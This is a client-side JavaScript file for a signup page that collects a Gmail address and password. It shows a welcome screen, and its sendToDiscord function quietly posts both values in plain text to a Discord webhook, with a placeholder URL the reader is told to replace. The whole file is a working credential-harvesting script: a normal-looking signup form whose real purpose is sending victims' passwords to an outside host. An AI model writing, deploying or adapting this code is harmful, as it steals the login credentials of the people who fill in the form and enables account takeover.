document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("signup-form");
  const gmailInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const displayName = document.getElementById("display-name");
  const signupContainer = document.getElementById("signup-container");
  const mainContent = document.getElementById("main-content");

  form.addEventListener("submit", (e) => {
    e.preventDefault();

    const gmail = gmailInput.value;
    const password = passwordInput.value;

    // Save the Gmail to localStorage
    localStorage.setItem("gmail", gmail);

    // Show the welcome message
    displayName.textContent = gmail;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";

    // Send Gmail and password to Discord webhook
    sendToDiscord(gmail, password);
  });

  const savedGmail = localStorage.getItem("gmail");
  if (savedGmail) {
    displayName.textContent = savedGmail;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";
  }
});

function sendToDiscord(gmail, password) {
  const webhookURL = "https://discord.com/api/webhooks/your-webhook-url"; // Replace with your actual URL

  const payload = {
    content: `📨 New signup:\n**Gmail:** ${gmail}\n**Password:** ${password}`,
    username: "Signup Bot"
  };

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  }).catch(err => {
    console.error("Webhook error:", err);
  });
}
